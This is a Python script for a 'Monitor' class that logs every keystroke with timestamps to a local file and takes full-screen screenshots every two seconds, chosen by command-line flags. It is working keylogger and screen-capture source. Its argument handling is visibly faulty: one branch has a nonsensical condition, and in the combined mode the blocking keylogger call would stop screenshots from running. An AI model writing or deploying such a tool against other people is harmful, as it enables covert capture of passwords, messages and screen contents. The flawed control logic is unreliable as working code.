from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread
import time
import os
import sys



class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)
            


class Monitor:


    def _sys_commands(self, interval=1):
        if sys.argv[1] == '-K':
            self._check_logs()
            self._keylogger()
        elif sys.argv[1] == '-S':
            self._check_logs()
            while True:
                self._screenshot()
                time.sleep(2)
##            IntervalTimer(interval,self._screenshot).start()
        elif sys.argv[1:2] == '-S' and '-K' or '-K' and '-S':
            self._check_logs()
            self._keylogger()
            self._screenshot()
##            IntervalTimer(interval,self._screenshot).start()
        else:
            print('error')

       
    

    def _on_press(self, k):
        with open('./logs/keylogs/log.txt', 'a') as f:
            f.write('{}\t\t{}\n'.format(k, time.time()))

    def _check_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')
        
        
    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        sct=mss()
        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))
    def run(self, interval=1):
        "Interval is amount of time between screenshots"
        self._check_logs()
        IntervalTimer(interval,self._screenshot).start()
        Thread(target=self._keylogger).start()
        
            

if __name__ == "__main__":
   mon = Monitor()
   mon._sys_commands()









